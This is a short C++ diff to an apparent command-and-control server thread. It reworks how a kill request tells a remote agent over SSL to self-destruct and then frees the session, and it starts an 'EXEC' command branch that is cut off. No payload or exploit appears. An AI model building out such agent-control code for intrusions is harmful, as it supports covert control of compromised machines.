@@ -76,21 +76,28 @@ void IPCServerThread() {
                 int id = std::stoi(request.substr(5));
                 std::lock_guard<std::mutex> lock(session_mutex);
                 if (active_sessions.count(id)) {
-                    if (SendSecureMessage(active_sessions[id].ssl, ":kill")) {
-                        std::string output;
+                    // Send :kill signal
+                    bool sent = SendSecureMessage(active_sessions[id].ssl, ":kill");
+                    std::string output;
+                    
+                    // Try to receive final acknowledgment, but don't hang if agent dies instantly
+                    if (sent) {
                         ReceiveSecureMessage(active_sessions[id].ssl, output);
-                        SSL_free(active_sessions[id].ssl);
-                        active_sessions.erase(id);
+                    }
+                    
+                    SSL_free(active_sessions[id].ssl);
+                    active_sessions.erase(id);
+                    
+                    if (sent) {
                         response = "KILLED|" + (output.empty() ? "Agent self-destructed successfully." : output);
                     } else {
-                        SSL_free(active_sessions[id].ssl);
-                        active_sessions.erase(id);
-                        response = "ERR_SEND";
+                        response = "KILLED|Agent connection lost (likely self-destructed).";
                     }
                 } else {
                     response = "ERR_ID";
                 }
             }
+
             else if (request.substr(0, 5) == "EXEC ") {
                 size_t space = request.find(' ', 5);
                 if (space != std::string::npos) {
